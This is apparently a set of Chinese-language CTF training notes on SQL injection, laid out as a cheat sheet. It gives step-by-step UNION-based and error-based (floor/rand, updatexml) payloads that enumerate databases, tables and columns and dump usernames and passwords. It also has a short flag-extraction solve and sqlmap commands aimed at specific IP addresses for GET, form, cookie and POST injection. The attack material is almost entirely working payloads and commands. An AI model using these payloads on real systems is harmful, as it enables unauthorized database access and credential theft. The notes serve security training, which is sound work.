# xman培训

## 第一种sql

1. ?id=1
2. ?id=1'
3. ?id=1' order by 3 %23 **/数字可以到几就是有几列可以显示。目前只有三列** 
4. ?id=-1' union select 1,2,3 %23 **/查看是否可以显示123,匹配字段**
5. ?id=-1' union select 1,version(),user() %23 **/这里2和3可以显示**
6. ?id=-1' union select 1,@@version(),database() %23 **/爆数据库（@@datadir数据库路径， @@basedir       mysql安装路径，@@version_compile_os  操作系统）**
7. ?id=1' and 1=2 union select 1,2,schema_name from information_schema.schemata limit 4,5 %23 **/爆数据库，limit 4，5（显示5条记录）**
8. ?id=1' and 1=2 union select 1,2,table_name from information_schema.tables where table_schema=0x7365637572697479 limit 0,1 %23  **/爆表，7365637572697479是上面的数据库名security转换16进制得来的,16进制常用，会被过滤**
9. ?id=1' and 1=2 union select 1,2,column_name from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x7573657273 limit 2,3 %23 **/获取列名** 
10. ?id=1' and 1=2 union select 1,2,concat_ws(char(32,58,32),username,password) from users limit 2,3 %23  **/获取内容**

## 第二种sql

1. ?id=-2' union select 1,user(),3 %23
2. ?id=1' and (select 1 from (select count(*),1,2,concat_ws(char(32,58,32),database(),floor(rand(0)*2))x from information_schema.tables group by x)a) %23
3. ?id=1' and (select 1 from (select count(*),1,2,concat_ws(char(32,58,32),(select password from users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) %23 **/1：floor()语句：and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);其中version是想要查找的。2：updatexml() Ǘ:and (updatexml(1,concat(0x3a,(select user())),1));**

# 星澜ctf培训sql

1
1'
1'#
1' order by 1 #
1' order by 10 #
1' order by 5 #
1' order by 3 #
1' order by 4 #
0' union select 1,2,3,4#
0' union select 1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),3,4#
fl4g,sc

0' union select 1,(select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME=0x666c3467),3,4#
skctf_flag

0' union select 1,(select skctf_flag from fl4g limit 1),3,4#

# sqlmap工具

## GET注入

python sqlmap.py -u "http://219.153.49.228:40304/flag.php?type=1" -D pentesterlab -T flag --columns

## 登录框（表单）注入

python sqlmap.py -u "http://219.153.49.228:48317/index.php" --form -D purchase -T admin --columns --batch

## 伪静态注入

python sqlmap.py -u "http://xxx.com/abc/a*.html" --dbs

## cookie注入

python sqlmap.py -u "http://59.63.200.79:8004/shownews.asp" --cookie="id=171" --level 2

## post注入

python sqlmap.py -u "http://59.63.200.79:8003/bees/admin/login.php" --data "user=admin&password=1" --dbs

python sqlmap.py -r 1.txt --dbs

## 判断

### 判断注入权限

python sqlmap.py -u "http://219.153.49.228:48657/index.php" --form --is-dba

### 判断当前数据库

python sqlmap.py -u "http://219.153.49.228:48657/index.php" --form -current-db

